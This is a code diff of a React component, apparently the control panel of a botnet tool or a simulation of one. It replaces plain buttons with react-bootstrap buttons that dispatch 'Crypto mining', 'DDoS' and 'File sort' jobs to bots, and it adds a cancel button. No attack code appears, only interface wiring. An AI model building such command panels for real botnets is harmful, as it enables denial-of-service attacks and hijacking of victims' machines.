@@ -1,5 +1,7 @@
 import React from "react";
 
+import { Button, Form, Row, Col } from "react-bootstrap";
+
 function BotnetCommands({
   id,
   botnetStatus,
@@ -27,32 +29,20 @@ function BotnetCommands({
 
   if (botnetStatus === "Waiting") {
     return (
-      <div style={{ marginTop: "20px" }}>
-        <button
-          className="grey-button"
-          onClick={() => createBotnetJob(cryptoJob)}
-        >
+      <>
+        <h4>Commands</h4>
+        <Button onClick={() => createBotnetJob(cryptoJob)}>
           Crypto mining
-        </button>
-        <button
-          className="grey-button"
-          onClick={() => createBotnetJob(ddosJob)}
-        >
-          DDoS
-        </button>
-        <button
-          className="grey-button"
-          onClick={() => createBotnetJob(fileSortJob)}
-        >
-          File sort
-        </button>
-      </div>
+        </Button>{" "}
+        <Button onClick={() => createBotnetJob(ddosJob)}>DDoS</Button>{" "}
+        <Button onClick={() => createBotnetJob(fileSortJob)}>File sort</Button>{" "}
+      </>
     );
   } else if (botnetStatus === "Working") {
     return (
-      <div style={{ marginTop: "20px" }}>
-        <button onClick={() => cancelBotnetJob()}>Cancel job</button>
-      </div>
+      <Button variant="danger" onClick={() => cancelBotnetJob()}>
+        Cancel command
+      </Button>
     );
   } else {
     return <></>;
